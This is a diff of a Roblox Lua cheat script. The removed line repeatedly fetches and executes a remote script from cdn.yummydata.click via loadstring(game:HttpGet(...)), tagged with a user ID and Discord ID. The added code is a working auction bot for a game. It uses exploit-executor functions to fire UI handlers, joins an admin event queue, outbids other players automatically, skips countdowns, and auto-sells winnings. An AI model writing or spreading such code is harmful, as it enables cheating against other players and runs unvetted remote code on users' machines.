@@ -1,1 +1,170 @@
-_G.Config={UserID="3087df52-2f5c-4e6f-a407-10fa72d16932",discord_id="1135837863603351573",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/ts"))()end)if s then break end wait(5)end
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local taskWait = task.wait
+
+local RepLibrary = require(ReplicatedStorage.Modules.RepLibrary)
+
+local Auctions = ReplicatedStorage.Events.Auctions
+local EnterQueue = Auctions.EnterQueue
+local Skip = Auctions.Skip
+local SkipCountdown = Auctions.SkipCountdown
+local UpdateCurrentBid = Auctions.UpdateCurrentBid
+local PlaceBid = Auctions.PlaceBid
+
+local DataEvent = ReplicatedStorage.Events.Data.GetAll
+
+local AuctionsFolder = workspace.Debris.Auctions
+
+local inAuction = false
+local currentGarage
+local currentNextBid
+local currentBidder
+local garageIndex = 0
+
+local function tryClick(obj)
+	if not obj then return end
+	pcall(function() obj:Activate() end)
+	if getconnections then
+		for _,v in pairs(getconnections(obj.MouseButton1Click)) do
+			pcall(function() v:Fire() end)
+		end
+	end
+end
+
+local function inventoryFull()
+	local data = DataEvent:InvokeServer()
+	local invItems = 0
+	for _ in pairs(data.Inventory) do
+		invItems = invItems + 1
+	end
+	local invSpace = RepLibrary:GetInventorySpace(LocalPlayer,data.InventoryLevel)
+	return invItems >= invSpace
+end
+
+local function getSelectableCount()
+	local data = DataEvent:InvokeServer()
+
+	local carrySpace = RepLibrary:GetCarrySpace(LocalPlayer,data.CarryLevel)
+	local invSpace = RepLibrary:GetInventorySpace(LocalPlayer,data.InventoryLevel)
+
+	local invItems = 0
+	for _ in pairs(data.Inventory) do
+		invItems = invItems + 1
+	end
+
+	local carryItems = data.Carry and #data.Carry or 0
+
+	local availableCarry = carrySpace - carryItems
+	local availableInv = invSpace - invItems
+
+	return math.max(0,math.min(availableCarry,availableInv))
+end
+
+local function handleItemsWon()
+	local gui = LocalPlayer.PlayerGui:WaitForChild("ItemsWon")
+	local frame = gui.ItemsFrame.Frame
+	local confirm = gui.ItemsFrame.ConfirmButton
+
+	local maxSelect = getSelectableCount()
+	if maxSelect <= 0 then return end
+
+	local selected = 0
+
+	for _,btn in ipairs(frame:GetChildren()) do
+		if btn:IsA("ImageButton") then
+			if selected >= maxSelect then break end
+			tryClick(btn)
+			selected += 1
+			task.wait(0.4)
+		end
+	end
+
+	repeat taskWait() until confirm.Visible
+	tryClick(confirm)
+
+	task.wait(1)
+
+	local sellButton = gui.SellItems.Frame.Normal.Button
+	repeat taskWait() until sellButton.Visible
+	tryClick(sellButton)
+end
+
+UpdateCurrentBid.OnClientEvent:Connect(function(data)
+	if data then
+		currentNextBid = data.nextBid
+		currentBidder = data.player
+	end
+end)
+
+AuctionsFolder.ChildAdded:Connect(function(garage)
+	currentGarage = garage
+	garageIndex += 1
+	inAuction = true
+end)
+
+AuctionsFolder.ChildRemoved:Connect(function()
+	if #AuctionsFolder:GetChildren() == 0 then
+		inAuction = false
+		currentGarage = nil
+		garageIndex = 0
+	end
+end)
+
+while true do
+
+	while inventoryFull() do
+		task.wait(300)
+	end
+
+	pcall(function()
+		EnterQueue:InvokeServer("AdminEvent",104)
+	end)
+
+	repeat taskWait(0.1) until inAuction
+
+	while inAuction do
+
+		if garageIndex == 1 or garageIndex == 2 then
+
+			local start = tick()
+
+			while inAuction and garageIndex <= 2 and tick() - start < 60 do
+
+				if currentNextBid and currentBidder ~= LocalPlayer then
+					pcall(function()
+						PlaceBid:InvokeServer(currentNextBid)
+					end)
+				end
+
+				task.wait(0.2)
+
+			end
+
+		elseif garageIndex == 3 then
+
+			pcall(function()
+				SkipCountdown:InvokeServer()
+			end)
+
+			task.wait(0.1)
+
+			pcall(function()
+				Skip:InvokeServer()
+			end)
+
+		end
+
+		task.wait(0.5)
+
+	end
+
+	task.wait(3)
+
+	if LocalPlayer.PlayerGui:FindFirstChild("ItemsWon") then
+		handleItemsWon()
+	end
+
+	task.wait(2)
+
+end
